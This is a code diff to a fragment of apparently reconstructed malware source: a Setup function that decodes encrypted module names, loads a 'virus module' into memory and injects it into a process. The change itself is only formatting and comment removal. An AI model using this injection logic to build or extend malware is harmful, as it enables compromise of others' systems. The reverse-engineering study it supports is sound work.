@@ -207,14 +207,16 @@ INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSi
 	GENERAL_INFO_BLOCK sInfoBlock; // [sp+4h] [bp-80h]@1
 
 	// Get a random module name with the format "KERNEL32.DLL.ASLR.XXXXXXXX"
-	if(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0) return 0;
+	if(GetRandomModuleName(&sInfoBlock, szDebugModuleName) != 0)
+		return 0;
 
 	// Decrypt the Kernel32's and NTDLL's function names
-	if(bSetup && DecodeEncryptedModuleNames() == FALSE) return -12;
+	if(bSetup && DecodeEncryptedModuleNames() == FALSE)
+		return -12;
 
-	// Last 4 arguments seem to have been mangled, as -1 is a nonsensical index.
 	iResult = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
-	if(iResult) return iResult;
+	if(iResult)
+		return iResult;
 
 	// One-time
 	if(bSetup)
@@ -225,7 +227,6 @@ INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSi
 		bSetup = FALSE;
 	}
 
-	// Unknown
 	iResult = LoadAndInjectVirus((PASM_CODE_BLOCKS_HEADER)s_ASMCodeBlocksPTR, (PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR, &sInfoBlock);
 	if(!iResult)
 		*hVirusModule = ((PVIRUS_MODULE_BLOCKS_HEADER)s_virusBlocksPTR)->VirusModulePointer;
